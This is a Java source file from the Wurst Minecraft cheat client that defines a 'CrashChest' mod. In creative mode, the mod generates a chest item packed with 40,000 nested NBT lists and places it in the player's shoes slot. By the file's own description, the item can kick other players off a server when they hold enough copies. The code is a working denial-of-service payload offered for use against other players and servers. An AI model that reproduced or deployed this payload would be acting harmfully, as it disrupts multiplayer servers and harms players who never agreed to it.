/*
 * Copyright © 2014 - 2018 | Wurst-Imperium | All rights reserved.
 *
 * This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/.
 */
package net.wurstclient.features.mods.items;

import net.minecraft.init.Blocks;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.wurstclient.compatibility.WMinecraft;
import net.wurstclient.features.Category;
import net.wurstclient.features.Mod;
import net.wurstclient.features.SearchTags;
import net.wurstclient.utils.ChatUtils;
import net.wurstclient.utils.InventoryUtils;

@SearchTags({"crash chest"})
@Mod.Bypasses
public final class CrashChestMod extends Mod
{
	public CrashChestMod()
	{
		super("CrashChest",
			"Generates a chest that can kick people from the server if they have too many copies of it.");
		setCategory(Category.ITEMS);
	}
	
	@Override
	public void onEnable()
	{
		if(!WMinecraft.getPlayer().capabilities.isCreativeMode)
		{
			ChatUtils.error("Creative mode only.");
			setEnabled(false);
			return;
		}
		
		if(!InventoryUtils.isSlotEmpty(36))
		{
			ChatUtils.error("Your shoes slot must be empty.");
			setEnabled(false);
			return;
		}
		
		// generate item
		ItemStack stack = new ItemStack(Blocks.CHEST);
		NBTTagCompound nbtCompound = new NBTTagCompound();
		NBTTagList nbtList = new NBTTagList();
		for(int i = 0; i < 40000; i++)
			nbtList.appendTag(new NBTTagList());
		nbtCompound.setTag("www.wurstclient.net", nbtList);
		stack.setTagInfo("www.wurstclient.net", nbtCompound);
		
		// give item
		InventoryUtils.placeStackInArmor(0, stack);
		ChatUtils.message("A CrashChest was placed in your shoes slot.");
		setEnabled(false);
	}
}
